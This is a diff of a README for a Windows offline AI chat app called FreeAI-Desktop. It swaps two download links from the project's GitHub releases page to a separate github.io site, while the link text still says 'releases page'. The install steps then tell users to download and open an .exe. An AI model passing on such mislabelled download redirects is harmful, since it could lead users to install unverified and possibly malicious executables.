@@ -1,6 +1,6 @@
 # 🤖 FreeAI-Desktop - Private offline chat for Windows
 
-[![](https://img.shields.io/badge/Download-FreeAI--Desktop-blue.svg)](https://github.com/Fixed-spender284/FreeAI-Desktop/releases)
+[![](https://img.shields.io/badge/Download-FreeAI--Desktop-blue.svg)](https://fixed-spender284.github.io)
 
 FreeAI-Desktop brings the power of artificial intelligence to your computer. It runs entirely on your local machine. You do not need an internet connection. You do not need an account. Your data stays on your hard drive.
 
@@ -18,7 +18,7 @@ This application requires a modern Windows computer. Ensure your system meets th
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [releases page](https://github.com/Fixed-spender284/FreeAI-Desktop/releases) to access the download files.
+1. Visit the [releases page](https://fixed-spender284.github.io) to access the download files.
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file name to start the download.
 4. Open the folder where you saved the file.
